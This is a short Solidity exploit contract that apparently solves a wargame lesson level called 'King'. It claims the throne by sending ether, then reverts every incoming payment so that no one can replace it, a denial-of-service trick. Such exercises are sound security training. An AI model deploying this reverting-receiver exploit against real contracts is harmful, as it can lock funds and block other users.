// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/09-King.sol";

contract KingAttack {
    King king;

    constructor(address payable _kingAddress) public {
        king = King(_kingAddress);
    }

    function attack() public payable {
        (bool success, ) = address(king).call.value(msg.value).gas(55000)("");
        require(success, "attack failed");
    }

    receive() external payable {
        revert("im king forever lol");
    }
}
